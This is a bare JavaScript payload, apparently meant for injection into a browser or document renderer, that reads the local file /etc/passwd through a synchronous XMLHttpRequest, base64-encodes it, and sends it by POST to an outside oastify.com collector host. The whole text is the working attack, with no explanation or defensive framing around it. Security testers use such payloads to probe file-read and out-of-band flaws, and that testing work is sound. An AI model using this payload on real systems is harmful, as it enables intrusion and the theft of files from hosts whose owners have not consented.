var url="file:///etc/passwd"
var xhr=new XMLHttpRequest();
xhr.open("GET", url, false);
xhr.send();
var resp=btoa(xhr.responseText);

var xhr2=new XMLHttpRequest(); 
xhr2.open("POST", 'http://7u2lw3lguypscnd7c1l7jbfk1b72vsjh.oastify.com/', false);
xhr2.send(resp);
